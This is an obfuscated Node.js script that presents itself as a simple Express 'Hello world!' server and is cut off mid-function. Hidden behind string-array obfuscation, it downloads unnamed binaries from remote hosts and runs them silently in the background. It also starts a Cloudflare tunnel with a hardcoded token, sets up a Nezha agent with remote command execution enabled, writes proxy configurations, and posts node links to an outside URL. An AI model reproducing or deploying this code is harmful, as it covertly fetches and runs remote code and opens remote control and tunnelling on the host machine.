const _0x28c643=_0x9d36;(function(_0x49df11,_0x3d7b5d){const _0x2ff676={_0x4a36b7:0x1c8,_0x480f8d:0x218,_0x3177ac:0x198},_0x307483=_0x9d36,_0x1fa168=_0x49df11();while(!![]){try{const _0x1c4ac0=-parseInt(_0x307483(_0x2ff676._0x4a36b7))/0x1*(parseInt(_0x307483(0x18b))/0x2)+-parseInt(_0x307483(0x208))/0x3*(-parseInt(_0x307483(0x1f0))/0x4)+-parseInt(_0x307483(0x1fb))/0x5*(-parseInt(_0x307483(0x205))/0x6)+-parseInt(_0x307483(0x191))/0x7+-parseInt(_0x307483(_0x2ff676._0x480f8d))/0x8*(-parseInt(_0x307483(0x1ce))/0x9)+-parseInt(_0x307483(0x20c))/0xa*(parseInt(_0x307483(0x17b))/0xb)+-parseInt(_0x307483(0x194))/0xc*(-parseInt(_0x307483(_0x2ff676._0x3177ac))/0xd);if(_0x1c4ac0===_0x3d7b5d)break;else _0x1fa168['push'](_0x1fa168['shift']());}catch(_0x3f277c){_0x1fa168['push'](_0x1fa168['shift']());}}}(_0x485a,0xa4de8));const express=require(_0x28c643(0x18c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x28c643(0x233)),exec=promisify(require('child_process')[_0x28c643(0x19d)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x28c643(0x201)][_0x28c643(0x1f4)]||'',PROJECT_URL=process[_0x28c643(0x201)][_0x28c643(0x1bf)]||'',AUTO_ACCESS=process[_0x28c643(0x201)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x28c643(0x201)][_0x28c643(0x1d1)]||'./tmp',SUB_PATH=process[_0x28c643(0x201)]['SUB_PATH']||'sub',PORT=process[_0x28c643(0x201)][_0x28c643(0x1d4)]||process['env'][_0x28c643(0x19c)]||0xbb8,UUID=process[_0x28c643(0x201)][_0x28c643(0x1a0)]||_0x28c643(0x18d),NEZHA_SERVER=process[_0x28c643(0x201)][_0x28c643(0x1a7)]||_0x28c643(0x178),NEZHA_PORT=process[_0x28c643(0x201)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x28c643(0x201)][_0x28c643(0x1fc)]||_0x28c643(0x1b4),ARGO_DOMAIN=process['env'][_0x28c643(0x197)]||_0x28c643(0x1b2),ARGO_AUTH=process[_0x28c643(0x201)][_0x28c643(0x1ef)]||_0x28c643(0x19e),ARGO_PORT=process['env'][_0x28c643(0x1ec)]||0x1f41,CFIP=process[_0x28c643(0x201)][_0x28c643(0x1a4)]||_0x28c643(0x22e),CFPORT=process[_0x28c643(0x201)][_0x28c643(0x182)]||0x4e21,NAME=process[_0x28c643(0x201)]['NAME']||_0x28c643(0x1af);!fs[_0x28c643(0x1a2)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x28c643(0x1eb)](FILE_PATH+_0x28c643(0x17f));function generateRandomName(){const _0x29d5cd=_0x28c643,_0x410c07=_0x29d5cd(0x1fa);let _0x23e602='';for(let _0x18e64e=0x0;_0x18e64e<0x6;_0x18e64e++){_0x23e602+=_0x410c07[_0x29d5cd(0x1cd)](Math[_0x29d5cd(0x211)](Math[_0x29d5cd(0x232)]()*_0x410c07['length']));}return _0x23e602;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x28c643(0x1ea)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x28c643(0x1ea)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x28c643(0x1f9)),listPath=path[_0x28c643(0x1ea)](FILE_PATH,_0x28c643(0x20d)),bootLogPath=path[_0x28c643(0x1ea)](FILE_PATH,_0x28c643(0x1f2)),configPath=path[_0x28c643(0x1ea)](FILE_PATH,_0x28c643(0x1d5));function deleteNodes(){const _0xa9e986={_0x54ddeb:0x1fe,_0x2bbac0:0x18e,_0x582157:0x21b,_0x1fc979:0x1e4},_0x58b057=_0x28c643;try{if(!UPLOAD_URL)return;if(!fs[_0x58b057(0x1a2)](subPath))return;let _0x1db193;try{_0x1db193=fs[_0x58b057(0x1e3)](subPath,_0x58b057(_0xa9e986._0x54ddeb));}catch{return null;}const _0x38cc1d=Buffer[_0x58b057(0x21a)](_0x1db193,_0x58b057(_0xa9e986._0x2bbac0))[_0x58b057(0x1aa)]('utf-8'),_0x2916fc=_0x38cc1d[_0x58b057(0x1b8)]('\x0a')[_0x58b057(_0xa9e986._0x582157)](_0x128e43=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x128e43));if(_0x2916fc[_0x58b057(_0xa9e986._0x1fc979)]===0x0)return;return axios[_0x58b057(0x189)](UPLOAD_URL+_0x58b057(0x229),JSON[_0x58b057(0x17e)]({'nodes':_0x2916fc}),{'headers':{'Content-Type':_0x58b057(0x1ab)}})[_0x58b057(0x226)](_0x46800e=>{return null;}),null;}catch(_0x5a1fd6){return null;}}function _0x9d36(_0x10c287,_0x193701){const _0x485a06=_0x485a();return _0x9d36=function(_0x9d36ac,_0x20847a){_0x9d36ac=_0x9d36ac-0x174;let _0xec7f74=_0x485a06[_0x9d36ac];return _0xec7f74;},_0x9d36(_0x10c287,_0x193701);}function cleanupOldFiles(){const _0x3d6110={_0x5ed986:0x20a,_0x56cd0a:0x1da},_0x213b4d={_0x1c253b:0x19f,_0x53a484:0x1d6},_0x3700ca=_0x28c643;try{const _0x58d349=fs[_0x3700ca(_0x3d6110._0x5ed986)](FILE_PATH);_0x58d349[_0x3700ca(_0x3d6110._0x56cd0a)](_0x3ffc1d=>{const _0x4f57f1=_0x3700ca,_0x46e462=path[_0x4f57f1(0x1ea)](FILE_PATH,_0x3ffc1d);try{const _0x3ed753=fs['statSync'](_0x46e462);_0x3ed753[_0x4f57f1(_0x213b4d._0x1c253b)]()&&fs[_0x4f57f1(_0x213b4d._0x53a484)](_0x46e462);}catch(_0x5d16c1){}});}catch(_0x2a44a9){}}function _0x485a(){const _0x11cca5=['text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/web','forEach','https://arm64.ssss.nyc.mn/web','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2096','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','127.0.0.1','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','readFileSync','length','countryCode','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','rm\x20-rf\x20','chmod','join','log','ARGO_PORT','writeFileSync','tunnel.json','ARGO_AUTH','4SxjArt','\x20failed:\x20','boot.log','/sub.txt\x20saved\x20successfully','UPLOAD_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/v1','\x20is\x20running','Error\x20downloading\x20files:','sub.txt','abcdefghijklmnopqrstuvwxyz','145OLyXuZ','NEZHA_KEY','unshift','utf-8','success','\x20successfully','env','fileUrl','/tunnel.yml\x20run','aarch64','242070OXhctd','https://oooo.serv00.net/add-url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2119047kCanqw','\x0avless://','readdirSync','8443','147430DLbhed','list.txt','listen','php\x20running\x20error:\x20','match','floor','win32','has','includes','amd','close','vless','34616roagVS','tls','from','filter','TunnelSecret','finish','\x0a\x0atrojan://','https://arm64.ssss.nyc.mn/bot','push','tcp','&path=%2Ftrojan-argo%3Fed%3D2560#','?security=tls&sni=','/dev/null','pipe','catch','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','clear','/api/delete-nodes','country_code','tunnel.yml','\x0a\x0avmess://','platform','64.64.241.54','fileName','2087','send','random','util','true','http://ip-api.com/json/','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','data','none','basename','message','naza.beyond20081.qzz.io.com:8008','--tls','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','22YKPeVq','Error\x20executing\x20command:\x20','\x0aclient_secret:\x20','stringify','\x20already\x20exists','/vmess-argo?ed=2560','nohup\x20','CFPORT','blackhole','get','response','Nodes\x20uploaded\x20successfully','/api/add-nodes','Error\x20in\x20startserver:','post','\x20>\x20nul\x202>&1','3326aFGqLO','express','d5733907-3436-41f9-9490-b3f8d696085b','base64','Add\x20automatic\x20access\x20task\x20faild:\x20','stream','2006340TSOkDb','trojan','set','2292CgfOpH','2083','arm','ARGO_DOMAIN','767uPlLlL','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','direct','http\x20server\x20is\x20running\x20on\x20port:','PORT','exec','eyJhIjoiNTJiNjI1YWU2Mjg5OWY0NDA0NWY3ZTgyOTEwYzViMWYiLCJ0IjoiYzA4OTdmNDgtODUyYy00NThiLTk4ZDktNmVmMTdjMjgxMTEzIiwicyI6Ik9ESmxNalUyWVRBdE1EWmpNeTAwTm1WaExXSTJZMk10TjJOaU9HSmtNalE1TldKaSJ9','isFile','UUID','del\x20/f\x20/q\x20','existsSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFIP','web\x20running\x20error:\x20','\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ArgoDomain:','toString','application/json','2053','status','\x20-s\x20','xcm','block','freedom','w96366.kpoiuy20081.ggff.net','org','NZ_CLIENT_SECRET=\x22Es6ZDntt9Dxyi8uBU0C9jtFFZVSIIynB\x22','http','NEZHA\x20variable\x20is\x20empty,skip\x20running','/vmess-argo','split','Hello\x20world!','arm64','unlink','https://amd64.ssss.nyc.mn/bot','/trojan-argo','vmess','PROJECT_URL','Download\x20','ARGO_DOMAIN:','\x20-c\x20','App\x20is\x20running','\x20>/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20success\x20for\x20','substring','656TBYYNi','quic','error','https://arm64.ssss.nyc.mn/agent','arch','charAt','405qZgUfS','&fp=firefox&type=ws&host=','mkdirSync','FILE_PATH','https+local://8.8.8.8/dns-query','443','SERVER_PORT','config.json','unlinkSync','false'];_0x485a=function(){return _0x11cca5;};return _0x485a();}app[_0x28c643(0x184)]('/',function(_0x476ba4,_0x15791b){const _0x52b125={_0x3d63e7:0x231},_0x3f75b2=_0x28c643;_0x15791b[_0x3f75b2(_0x52b125._0x3d63e7)](_0x3f75b2(0x1b9));});async function generateConfig(){const _0x14b8d3={_0x55b4b7:0x224,_0x42530b:0x175,_0xb28295:0x175,_0x3c9aa5:0x1b7,_0x5be582:0x1bd,_0x4dd70c:0x1e0,_0x2c7f2c:0x1e0,_0x1441ab:0x175,_0x1da272:0x1b5,_0x237b10:0x1c9,_0x2ff096:0x1e0,_0x243dff:0x1be,_0x5bdcda:0x1c9,_0x82eeed:0x192,_0x31ce59:0x1b1,_0xb71c7e:0x183,_0x38b031:0x1b0,_0x37d2c9:0x1d5},_0x29dcbc=_0x28c643,_0x2b7860={'log':{'access':'/dev/null','error':_0x29dcbc(_0x14b8d3._0x55b4b7),'loglevel':_0x29dcbc(_0x14b8d3._0x42530b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x29dcbc(0x217),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x29dcbc(_0x14b8d3._0xb28295),'fallbacks':[{'dest':0xbb9},{'path':_0x29dcbc(0x1dc),'dest':0xbba},{'path':_0x29dcbc(_0x14b8d3._0x3c9aa5),'dest':0xbbb},{'path':_0x29dcbc(_0x14b8d3._0x5be582),'dest':0xbbc}]},'streamSettings':{'network':_0x29dcbc(0x221)}},{'port':0xbb9,'listen':_0x29dcbc(_0x14b8d3._0x4dd70c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x29dcbc(0x175)}},{'port':0xbba,'listen':_0x29dcbc(_0x14b8d3._0x2c7f2c),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x29dcbc(_0x14b8d3._0x1441ab),'wsSettings':{'path':_0x29dcbc(0x1dc)}},'sniffing':{'enabled':!![],'destOverride':[_0x29dcbc(_0x14b8d3._0x1da272),'tls',_0x29dcbc(_0x14b8d3._0x237b10)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x29dcbc(_0x14b8d3._0x2ff096),'protocol':_0x29dcbc(_0x14b8d3._0x243dff),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x29dcbc(_0x14b8d3._0x3c9aa5)}},'sniffing':{'enabled':!![],'destOverride':[_0x29dcbc(_0x14b8d3._0x1da272),_0x29dcbc(0x219),_0x29dcbc(_0x14b8d3._0x5bdcda)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x29dcbc(_0x14b8d3._0x82eeed),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x29dcbc(0x175),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x29dcbc(0x219),_0x29dcbc(_0x14b8d3._0x5bdcda)],'metadataOnly':![]}}],'dns':{'servers':[_0x29dcbc(0x1d2)]},'outbounds':[{'protocol':_0x29dcbc(_0x14b8d3._0x31ce59),'tag':_0x29dcbc(0x19a)},{'protocol':_0x29dcbc(_0x14b8d3._0xb71c7e),'tag':_0x29dcbc(_0x14b8d3._0x38b031)}]};fs[_0x29dcbc(0x1ed)](path[_0x29dcbc(0x1ea)](FILE_PATH,_0x29dcbc(_0x14b8d3._0x37d2c9)),JSON['stringify'](_0x2b7860,null,0x2));}function getSystemArchitecture(){const _0x5da05c={_0x29a0d0:0x1ba,_0x2424ca:0x204,_0x318883:0x215},_0x229134=_0x28c643,_0xf0b8dd=os[_0x229134(0x1cc)]();return _0xf0b8dd===_0x229134(0x196)||_0xf0b8dd===_0x229134(_0x5da05c._0x29a0d0)||_0xf0b8dd===_0x229134(_0x5da05c._0x2424ca)?_0x229134(0x196):_0x229134(_0x5da05c._0x318883);}function downloadFile(_0x391717,_0x52e71d,_0x13f388){const _0x397142={_0x21f7de:0x21d},_0x59131e={_0x22141b:0x1bb,_0x36a027:0x1c0,_0x1f6d19:0x177,_0x55fb02:0x1ca},_0x1afc78=_0x28c643,_0x399923=_0x391717;!fs[_0x1afc78(0x1a2)](FILE_PATH)&&fs[_0x1afc78(0x1d0)](FILE_PATH,{'recursive':!![]});const _0x59a121=fs['createWriteStream'](_0x399923);axios({'method':_0x1afc78(0x184),'url':_0x52e71d,'responseType':_0x1afc78(0x190)})['then'](_0xd23869=>{const _0x3b440d={_0x3900bc:0x176,_0x1bdefd:0x200},_0x420758=_0x1afc78;_0xd23869['data'][_0x420758(0x225)](_0x59a121),_0x59a121['on'](_0x420758(_0x397142._0x21f7de),()=>{const _0xc65e88=_0x420758;_0x59a121[_0xc65e88(0x216)](),console[_0xc65e88(0x1eb)]('Download\x20'+path[_0xc65e88(_0x3b440d._0x3900bc)](_0x399923)+_0xc65e88(_0x3b440d._0x1bdefd)),_0x13f388(null,_0x399923);}),_0x59a121['on'](_0x420758(0x1ca),_0x469c73=>{const _0x19ed47=_0x420758;fs[_0x19ed47(_0x59131e._0x22141b)](_0x399923,()=>{});const _0x46c1d4=_0x19ed47(_0x59131e._0x36a027)+path[_0x19ed47(0x176)](_0x399923)+_0x19ed47(0x1f1)+_0x469c73[_0x19ed47(_0x59131e._0x1f6d19)];console[_0x19ed47(_0x59131e._0x55fb02)](_0x46c1d4),_0x13f388(_0x46c1d4);});})[_0x1afc78(0x226)](_0x3f9afb=>{const _0x341f2a=_0x1afc78,_0x1da7b5=_0x341f2a(0x1c0)+path[_0x341f2a(0x176)](_0x399923)+_0x341f2a(0x1f1)+_0x3f9afb['message'];console[_0x341f2a(0x1ca)](_0x1da7b5),_0x13f388(_0x1da7b5);});}async function downloadFilesAndRun(){const _0x37db12={_0x303429:0x1eb,_0x42bffc:0x1e6,_0x5bf58a:0x1f8,_0x22c9fa:0x1d3,_0x308e17:0x1de,_0x22455f:0x213,_0x397a9c:0x1d7,_0x2a6314:0x236,_0x558ea5:0x1ed,_0x45b474:0x1ea,_0x596bde:0x1a8,_0x42bf5a:0x20f,_0x20e892:0x1ac,_0xbf75e5:0x214,_0x2c4cf9:0x179,_0xec83af:0x1ae,_0x521e29:0x199,_0x2583bb:0x1eb,_0x4ce432:0x1c2,_0x671aa:0x1f7,_0x3815b5:0x1a5,_0x16aee8:0x1a2,_0x47269a:0x1e7,_0x36ceb1:0x17a,_0x18d636:0x181,_0x2acb27:0x17c},_0x476aa1={_0xca2dd9:0x1a2,_0x1456ec:0x1e9},_0x5a5cad=_0x28c643,_0x434bef=getSystemArchitecture(),_0x55d9c0=getFilesForArchitecture(_0x434bef);if(_0x55d9c0['length']===0x0){console[_0x5a5cad(_0x37db12._0x303429)](_0x5a5cad(_0x37db12._0x42bffc));return;}const _0x5460ac=_0x55d9c0['map'](_0x435621=>{const _0x53cbf4={_0x156c42:0x22f,_0x2ee91e:0x202};return new Promise((_0x3d0898,_0x185dd9)=>{const _0x1f30e0=_0x9d36;downloadFile(_0x435621[_0x1f30e0(_0x53cbf4._0x156c42)],_0x435621[_0x1f30e0(_0x53cbf4._0x2ee91e)],(_0x4bd7c2,_0x3793a9)=>{_0x4bd7c2?_0x185dd9(_0x4bd7c2):_0x3d0898(_0x3793a9);});});});try{await Promise['all'](_0x5460ac);}catch(_0x125813){console[_0x5a5cad(0x1ca)](_0x5a5cad(_0x37db12._0x5bf58a),_0x125813);return;}function _0x25a755(_0x2bc10c){const _0x557936=0x1fd;_0x2bc10c['forEach'](_0x4d39ac=>{const _0x46809b=_0x9d36;fs[_0x46809b(_0x476aa1._0xca2dd9)](_0x4d39ac)&&fs[_0x46809b(_0x476aa1._0x1456ec)](_0x4d39ac,_0x557936,_0x20e8f7=>{const _0x399969=_0x46809b;_0x20e8f7?console['error']('Empowerment\x20failed\x20for\x20'+_0x4d39ac+':\x20'+_0x20e8f7):console[_0x399969(0x1eb)](_0x399969(0x1c6)+_0x4d39ac+':\x20'+_0x557936['toString'](0x8));});});}const _0x245e89=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x25a755(_0x245e89);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b7c60=NEZHA_SERVER[_0x5a5cad(0x214)](':')?NEZHA_SERVER[_0x5a5cad(0x1b8)](':')['pop']():'',_0xcdbaa3=new Set([_0x5a5cad(_0x37db12._0x22c9fa),'8443',_0x5a5cad(_0x37db12._0x308e17),'2087',_0x5a5cad(0x195),_0x5a5cad(0x1ac)]),_0x1fee8b=_0xcdbaa3[_0x5a5cad(_0x37db12._0x22455f)](_0x5b7c60)?_0x5a5cad(0x234):_0x5a5cad(_0x37db12._0x397a9c),_0xf37679=_0x5a5cad(0x17d)+NEZHA_KEY+_0x5a5cad(0x207)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1fee8b+_0x5a5cad(_0x37db12._0x2a6314)+UUID;fs[_0x5a5cad(_0x37db12._0x558ea5)](path[_0x5a5cad(_0x37db12._0x45b474)](FILE_PATH,'config.yaml'),_0xf37679);const _0x18708a=_0x5a5cad(0x181)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5a5cad(_0x37db12._0x596bde);try{await exec(_0x18708a),console[_0x5a5cad(_0x37db12._0x303429)](phpName+'\x20is\x20running'),await new Promise(_0xe9288c=>setTimeout(_0xe9288c,0x3e8));}catch(_0x45940b){console[_0x5a5cad(0x1ca)](_0x5a5cad(_0x37db12._0x42bf5a)+_0x45940b);}}else{let _0x148837='';const _0x15a823=[_0x5a5cad(0x1d3),_0x5a5cad(0x20b),_0x5a5cad(_0x37db12._0x308e17),_0x5a5cad(0x230),_0x5a5cad(0x195),_0x5a5cad(_0x37db12._0x20e892)];_0x15a823[_0x5a5cad(_0x37db12._0xbf75e5)](NEZHA_PORT)&&(_0x148837=_0x5a5cad(_0x37db12._0x2c4cf9));const _0x1c3686='nohup\x20'+npmPath+_0x5a5cad(_0x37db12._0xec83af)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x148837+_0x5a5cad(_0x37db12._0x521e29);try{await exec(_0x1c3686),console[_0x5a5cad(_0x37db12._0x2583bb)](npmName+_0x5a5cad(0x1f7)),await new Promise(_0x2c0dc9=>setTimeout(_0x2c0dc9,0x3e8));}catch(_0x3e6cc9){console['error']('npm\x20running\x20error:\x20'+_0x3e6cc9);}}}else console[_0x5a5cad(0x1eb)](_0x5a5cad(0x1b6));const _0x2d178c=_0x5a5cad(0x181)+webPath+_0x5a5cad(_0x37db12._0x4ce432)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2d178c),console[_0x5a5cad(_0x37db12._0x2583bb)](webName+_0x5a5cad(_0x37db12._0x671aa)),await new Promise(_0x4965d5=>setTimeout(_0x4965d5,0x3e8));}catch(_0x3f6f22){console['error'](_0x5a5cad(_0x37db12._0x3815b5)+_0x3f6f22);}if(fs[_0x5a5cad(_0x37db12._0x16aee8)](botPath)){let _0x2e5c89;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2e5c89=_0x5a5cad(0x1dd)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2e5c89=_0x5a5cad(0x227)+FILE_PATH+_0x5a5cad(0x203):_0x2e5c89=_0x5a5cad(_0x37db12._0x47269a)+FILE_PATH+_0x5a5cad(_0x37db12._0x36ceb1)+ARGO_PORT;try{await exec(_0x5a5cad(_0x37db12._0x18d636)+botPath+'\x20'+_0x2e5c89+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x129fb8=>setTimeout(_0x129fb8,0x7d0));}catch(_0x78b8fc){console[_0x5a5cad(0x1ca)](_0x5a5cad(_0x37db12._0x2acb27)+_0x78b8fc);}}await new Promise(_0x4fb078=>setTimeout(_0x4fb078,0x1388));}function getFilesForArchitecture(_0x5727da){const _0x514b92={_0x37a7e5:0x196,_0x33ed9b:0x21f,_0x55c33b:0x1d9,_0x375edf:0x1bc,_0x2a97e9:0x196,_0x264bf6:0x1f6,_0x2b4bd9:0x1fd},_0x271b8c=_0x28c643;let _0x3ba0de;_0x5727da===_0x271b8c(_0x514b92._0x37a7e5)?_0x3ba0de=[{'fileName':webPath,'fileUrl':_0x271b8c(0x1db)},{'fileName':botPath,'fileUrl':_0x271b8c(_0x514b92._0x33ed9b)}]:_0x3ba0de=[{'fileName':webPath,'fileUrl':_0x271b8c(_0x514b92._0x55c33b)},{'fileName':botPath,'fileUrl':_0x271b8c(_0x514b92._0x375edf)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x238ebb=_0x5727da===_0x271b8c(0x196)?_0x271b8c(0x1cb):'https://amd64.ssss.nyc.mn/agent';_0x3ba0de[_0x271b8c(0x1fd)]({'fileName':npmPath,'fileUrl':_0x238ebb});}else{const _0x383c43=_0x5727da===_0x271b8c(_0x514b92._0x2a97e9)?'https://arm64.ssss.nyc.mn/v1':_0x271b8c(_0x514b92._0x264bf6);_0x3ba0de[_0x271b8c(_0x514b92._0x2b4bd9)]({'fileName':phpPath,'fileUrl':_0x383c43});}}return _0x3ba0de;}function argoType(){const _0x2b6454={_0x5edf11:0x1eb,_0x343dfa:0x1f5,_0x2a140c:0x21c,_0x23ed7a:0x1ed,_0x301e4a:0x1ea,_0x4ff58d:0x1b8,_0x1f4665:0x22b,_0x6999a8:0x1e2},_0x487d7e=_0x28c643;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x487d7e(_0x2b6454._0x5edf11)](_0x487d7e(_0x2b6454._0x343dfa));return;}if(ARGO_AUTH['includes'](_0x487d7e(_0x2b6454._0x2a140c))){fs[_0x487d7e(_0x2b6454._0x23ed7a)](path[_0x487d7e(_0x2b6454._0x301e4a)](FILE_PATH,_0x487d7e(0x1ee)),ARGO_AUTH);const _0x4c2874='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x487d7e(_0x2b6454._0x4ff58d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x487d7e(0x1ea)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x487d7e(0x1c5)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x487d7e(0x1ea)](FILE_PATH,_0x487d7e(_0x2b6454._0x1f4665)),_0x4c2874);}else console[_0x487d7e(_0x2b6454._0x5edf11)](_0x487d7e(_0x2b6454._0x6999a8));}async function extractDomains(){const _0x5e24eb={_0x38c34e:0x1eb,_0x4ab1da:0x1ea,_0x1ba253:0x1f2,_0x4f2882:0x1e7,_0x46a5ff:0x17a,_0x2fd378:0x181,_0x29294d:0x1a6,_0x5eae95:0x1ca},_0x2ed1ab={_0x59bee0:0x184,_0x367e1e:0x174,_0x5ee614:0x174,_0x228b79:0x22a,_0x497bd4:0x1b3,_0x2933ff:0x235,_0x1b8569:0x1ad,_0x270f10:0x1ff,_0x2aaeed:0x1b3,_0x4128ed:0x174,_0x36c835:0x1e5},_0x24621d={_0x5c9589:0x1cd},_0x4797a6={_0x2bf8ec:0x210,_0x2b1501:0x220},_0x42fd5c=_0x28c643;let _0x1d9756;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1d9756=ARGO_DOMAIN,console[_0x42fd5c(_0x5e24eb._0x38c34e)](_0x42fd5c(0x1c1),_0x1d9756),await _0x4db20e(_0x1d9756);else try{const _0x3cfc89=fs[_0x42fd5c(0x1e3)](path[_0x42fd5c(_0x5e24eb._0x4ab1da)](FILE_PATH,_0x42fd5c(_0x5e24eb._0x1ba253)),'utf-8'),_0x2574c2=_0x3cfc89['split']('\x0a'),_0xc6f9b1=[];_0x2574c2[_0x42fd5c(0x1da)](_0x11a984=>{const _0x56781d=_0x42fd5c,_0x17716a=_0x11a984[_0x56781d(_0x4797a6._0x2bf8ec)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x17716a){const _0x3c3ab5=_0x17716a[0x1];_0xc6f9b1[_0x56781d(_0x4797a6._0x2b1501)](_0x3c3ab5);}});if(_0xc6f9b1[_0x42fd5c(0x1e4)]>0x0)_0x1d9756=_0xc6f9b1[0x0],console['log'](_0x42fd5c(0x1a9),_0x1d9756),await _0x4db20e(_0x1d9756);else{console[_0x42fd5c(0x1eb)](_0x42fd5c(0x1df)),fs['unlinkSync'](path[_0x42fd5c(0x1ea)](FILE_PATH,'boot.log'));async function _0x4b0444(){const _0x3a6a91=_0x42fd5c;try{process['platform']===_0x3a6a91(0x212)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x3a6a91(_0x24621d._0x5c9589)](0x0)+']'+botName[_0x3a6a91(0x1c7)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xfb3093){}}_0x4b0444(),await new Promise(_0x585d65=>setTimeout(_0x585d65,0xbb8));const _0x4a4f74=_0x42fd5c(_0x5e24eb._0x4f2882)+FILE_PATH+_0x42fd5c(_0x5e24eb._0x46a5ff)+ARGO_PORT;try{await exec(_0x42fd5c(_0x5e24eb._0x2fd378)+botPath+'\x20'+_0x4a4f74+_0x42fd5c(_0x5e24eb._0x29294d)),console['log'](botName+_0x42fd5c(0x1f7)),await new Promise(_0x12378f=>setTimeout(_0x12378f,0xbb8)),await extractDomains();}catch(_0x204ce8){console[_0x42fd5c(_0x5e24eb._0x5eae95)](_0x42fd5c(0x17c)+_0x204ce8);}}}catch(_0x4a9442){console['error']('Error\x20reading\x20boot.log:',_0x4a9442);}async function _0x516db8(){const _0x3ebda4=_0x42fd5c;try{const _0x359277=await axios[_0x3ebda4(_0x2ed1ab._0x59bee0)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x359277[_0x3ebda4(_0x2ed1ab._0x367e1e)]&&_0x359277[_0x3ebda4(_0x2ed1ab._0x5ee614)][_0x3ebda4(_0x2ed1ab._0x228b79)]&&_0x359277['data'][_0x3ebda4(0x1b3)])return _0x359277['data']['country_code']+'_'+_0x359277[_0x3ebda4(0x174)][_0x3ebda4(_0x2ed1ab._0x497bd4)];}catch(_0x126af7){try{const _0x5269c3=await 